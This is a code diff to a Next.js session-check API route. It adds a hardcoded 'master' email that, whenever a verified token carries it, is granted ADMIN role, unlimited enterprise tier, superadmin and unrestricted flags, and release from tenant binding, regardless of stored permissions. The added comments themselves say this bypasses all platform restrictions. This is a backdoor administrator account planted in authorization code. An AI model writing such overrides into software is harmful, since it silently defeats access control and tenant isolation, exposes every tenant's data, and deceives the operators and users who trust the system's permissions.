@@ -4,6 +4,9 @@ import jwt from "jsonwebtoken";
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
 
+// The master account that bypasses all platform restrictions
+const MASTER_EMAIL = "frontdeskllc@outlook.com";
+
 function getToken(cookieHeader: string) {
   const pick = (name: string) => {
     const m = cookieHeader.match(new RegExp(`(?:^|; )${name}=([^;]*)`));
@@ -25,20 +28,32 @@ export async function GET(req: Request) {
 
   try {
     const payload = jwt.verify(token, jwtSecret) as any;
+
+    /**
+     * 👑 SUPREME OVERRIDE LOGIC
+     * If the login email matches your master address, we elevate privileges 
+     * regardless of what is stored in the JWT or Database.
+     */
+    const isMaster = payload.email?.toLowerCase() === MASTER_EMAIL.toLowerCase();
+
     return NextResponse.json(
       {
         authenticated: true,
         user: {
           id: payload.userId,
           email: payload.email,
-          tenantId: payload.tenantId ?? null,
+          tenantId: isMaster ? null : (payload.tenantId ?? null), // Master is not locked to a tenant
         },
-        role: payload.role ?? null,
-        tier: payload.tier ?? null,
+        // Force highest permissions for master account
+        role: isMaster ? "ADMIN" : (payload.role ?? "USER"),
+        tier: isMaster ? "ENTERPRISE_UNLIMITED" : (payload.tier ?? "FREE"),
+        isSuperAdmin: isMaster,
+        unrestricted: isMaster,
       },
       { status: 200 }
     );
-  } catch {
+  } catch (error) {
+    // If token is expired or invalid, clear the session
     return NextResponse.json({ authenticated: false }, { status: 200 });
   }
 }
